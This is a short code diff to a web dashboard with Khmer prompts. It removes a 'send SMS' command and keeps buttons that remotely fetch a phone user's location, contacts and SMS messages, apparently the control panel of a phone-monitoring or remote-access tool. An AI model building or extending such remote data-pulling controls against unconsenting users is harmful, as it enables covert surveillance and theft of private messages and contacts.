@@ -1663,7 +1663,6 @@ async function renderDevices() {
                 <td>
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_location')">📍 Location</button>
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'make_call')">📞 Call</button>
-                  <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'send_sms')">💬 SMS</button>
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_contacts')">👥 Contacts</button>
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_sms')">📨 Read SMS</button>
                 </td>
@@ -1710,12 +1709,6 @@ window.sendDeviceCmd = async function(userId, cmdType) {
     const phone = prompt('បញ្ចូលលេខទូរស័ព្ទ:');
     if (!phone) return;
     payload = { phone };
-  } else if (cmdType === 'send_sms') {
-    const phone = prompt('បញ្ចូលលេខទូរស័ព្ទអ្នកទទួល:');
-    if (!phone) return;
-    const message = prompt('បញ្ចូលសារ SMS:');
-    if (!message) return;
-    payload = { phone, message };
   } else if (cmdType === 'get_contacts') {
     const query = prompt('ស្វែងរក contact (ទទេ = យកទាំងអស់):') || '';
     payload = { query };
